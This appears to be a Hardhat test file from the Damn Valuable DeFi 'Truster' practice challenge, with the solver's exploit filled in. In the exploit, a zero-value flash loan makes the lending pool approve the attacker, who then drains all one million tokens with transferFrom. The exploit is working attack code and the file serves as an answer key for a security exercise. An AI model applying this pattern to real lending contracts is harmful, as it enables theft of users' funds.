const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
  let deployer, attacker;

  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    const DamnValuableToken = await ethers.getContractFactory(
      'DamnValuableToken',
      deployer
    );
    const TrusterLenderPool = await ethers.getContractFactory(
      'TrusterLenderPool',
      deployer
    );

    this.token = await DamnValuableToken.deploy();
    this.pool = await TrusterLenderPool.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal('0');
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    // Can do via contract way, but want to illustrate more about ethers.js
    let ABI = [
      'function approve(address spender, uint256 amount) returns (bool)',
    ];
    let iface = new ethers.utils.Interface(ABI);
    await this.pool
      .connect(attacker)
      .flashLoan(
        0,
        attacker.address,
        this.token.address,
        iface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL])
      ); // learned this from here: https://ethereum.stackexchange.com/a/111361/100165
    await this.token
      .connect(attacker)
      .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL); // very important to connect spender (attacker)
    // I actually did two transactions above, you can ofc write a contract including above two steps
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(await this.token.balanceOf(attacker.address)).to.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.equal('0');
  });
});
